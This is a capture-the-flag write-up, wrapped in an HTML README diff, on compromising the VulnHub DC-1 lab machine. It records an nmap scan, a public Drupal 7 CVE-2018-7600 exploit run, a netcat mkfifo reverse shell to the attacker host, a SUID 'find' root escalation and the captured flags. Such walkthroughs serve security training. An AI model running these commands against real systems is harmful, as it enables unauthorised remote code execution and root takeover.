@@ -1,0 +1,152 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 10.0.2.31<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/DC_1]<br/>
+└─# nmap -sC -sV 10.0.2.31 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 03:18 +0630<br/>
+Nmap scan report for 10.0.2.31<br/>
+Host is up (0.000094s latency).<br/>
+Not shown: 65531 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; &nbsp;STATE SERVICE VERSION<br/>
+22/tcp &nbsp; &nbsp;open &nbsp;ssh &nbsp; &nbsp; OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 1024 c4d659e6774c227a961660678b42488f (DSA)<br/>
+| &nbsp; 2048 1182fe534edc5b327f446482757dd0a0 (RSA)<br/>
+|_ &nbsp;256 3daa985c87afea84b823688db9055fd8 (ECDSA)<br/>
+80/tcp &nbsp; &nbsp;open &nbsp;http &nbsp; &nbsp;Apache httpd 2.2.22 ((Debian))<br/>
+| http-robots.txt: 36 disallowed entries (15 shown)<br/>
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br/>
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br/>
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br/>
+|_/LICENSE.txt /MAINTAINERS.txt<br/>
+|_http-generator: Drupal 7 (http://drupal.org)<br/>
+|_http-title: Welcome to Drupal Site | Drupal Site<br/>
+|_http-server-header: Apache/2.2.22 (Debian)<br/>
+111/tcp &nbsp; open &nbsp;rpcbind 2-4 (RPC #100000)<br/>
+| rpcinfo: <br/>
+| &nbsp; program version &nbsp; &nbsp;port/proto &nbsp;service<br/>
+| &nbsp; 100000 &nbsp;2,3,4 &nbsp; &nbsp; &nbsp; &nbsp;111/tcp &nbsp; rpcbind<br/>
+| &nbsp; 100000 &nbsp;2,3,4 &nbsp; &nbsp; &nbsp; &nbsp;111/udp &nbsp; rpcbind<br/>
+| &nbsp; 100000 &nbsp;3,4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;111/tcp6 &nbsp;rpcbind<br/>
+| &nbsp; 100000 &nbsp;3,4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;111/udp6 &nbsp;rpcbind<br/>
+| &nbsp; 100024 &nbsp;1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;33870/tcp &nbsp; status<br/>
+| &nbsp; 100024 &nbsp;1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;36106/udp6 &nbsp;status<br/>
+| &nbsp; 100024 &nbsp;1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;39726/udp &nbsp; status<br/>
+|_ &nbsp;100024 &nbsp;1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;48569/tcp6 &nbsp;status<br/>
+33870/tcp open &nbsp;status &nbsp;1 (RPC #100024)<br/>
+MAC Address: 08:00:27:A1:E5:EB (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 23.23 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I research exploit about drupal 7 and found this cve:<br/>
+<br/>
+https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py<br/>
+<br/>
+I download this exploit:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/DC_1]<br/>
+└─# wget https://raw.githubusercontent.com/pimps/CVE-2018-7600/master/drupa7-CVE-2018-7600.py -O exploit.py<br/>
+--2023-02-20 03:23:31-- &nbsp;https://raw.githubusercontent.com/pimps/CVE-2018-7600/master/drupa7-CVE-2018-7600.py<br/>
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...<br/>
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: 2889 (2.8K) [text/plain]<br/>
+Saving to: ‘exploit.py’<br/>
+<br/>
+exploit.py &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;100%[==================================================================&gt;] &nbsp; 2.82K &nbsp;--.-KB/s &nbsp; &nbsp;in 0s &nbsp; &nbsp; &nbsp;<br/>
+<br/>
+2023-02-20 03:23:32 (55.8 MB/s) - ‘exploit.py’ saved [2889/2889]<br/>
+<br/>
+I test this exploit and it worked:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/DC_1]<br/>
+└─# python2 exploit.py http://10.0.2.31/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+()<br/>
+=============================================================================<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;by pimps &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |<br/>
+=============================================================================<br/>
+<br/>
+[*] Poisoning a form and including it in cache.<br/>
+[*] Poisoned form ID: form-P670eijShEGA6L2wp-ZOjByPr9RP8DcO5Z7cRTXXBDo<br/>
+[*] Triggering exploit to execute: id<br/>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>
+<br/>
+<br/>
+So, I decided to run reverse shell and got reverse shell:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/DC_1]<br/>
+└─# python2 exploit.py http://10.0.2.31/ -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f"<br/>
+()<br/>
+=============================================================================<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |<br/>
+| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;by pimps &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |<br/>
+=============================================================================<br/>
+<br/>
+[*] Poisoning a form and including it in cache.<br/>
+[*] Poisoned form ID: form-fLtd-0LQw8XUd0Fi00DQSoBl4x0Wt9TbZTk8aIZ_R0Q<br/>
+[*] Triggering exploit to execute: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f<br/>
+<br/>
+<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 4444<br/>
+listening on [any] 4444 ...<br/>
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.31] 35324<br/>
+sh: 0: can't access tty; job control turned off<br/>
+$ whoami<br/>
+www-data<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation<br/>
+<br/>
+After running linpeas, found "find" SUID so I look at into gtfobin for that SUID. I can use that SUID to get root shell:<br/>
+<br/>
+https://gtfobins.github.io/gtfobins/find/#suid<br/>
+<br/>
+www-data@DC-1:/tmp$ /usr/bin/find . -exec /bin/bash -p \; -quit<br/>
+bash-4.2# whoami<br/>
+root<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+All flag that I found (vulnhub flag)<br/>
+<br/>
+bash-4.2# cat /var/www/flag1.txt<br/>
+Every good CMS needs a config file - and so do you.<br/>
+<br/>
+bash-4.2# cat /home/flag4/flag4.txt<br/>
+Can you use this same method to find or access the flag in root?<br/>
+<br/>
+Probably. But perhaps it's not that easy. &nbsp;Or maybe it is?<br/>
+<br/>
+bash-4.2# cat /root/thefinalflag.txt<br/>
+Well done!!!!<br/>
+<br/>
+Hopefully you've enjoyed this and learned some new skills.<br/>
+<br/>
+You can let me know what you thought of this little journey<br/>
+by contacting me via Twitter - @DCAU7<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Offensive Security Playground Lab Flags<br/>
+<br/>
+www-data@DC-1:/var/www$ cat /home/local.txt<br/>
+07cc5d0bd7b745504bda8e22a19dacbd<br/>
+<br/>
+bash-4.2# cat proof.txt <br/>
+8f5b69876f6aad26244e26b8ec208191</body></html>
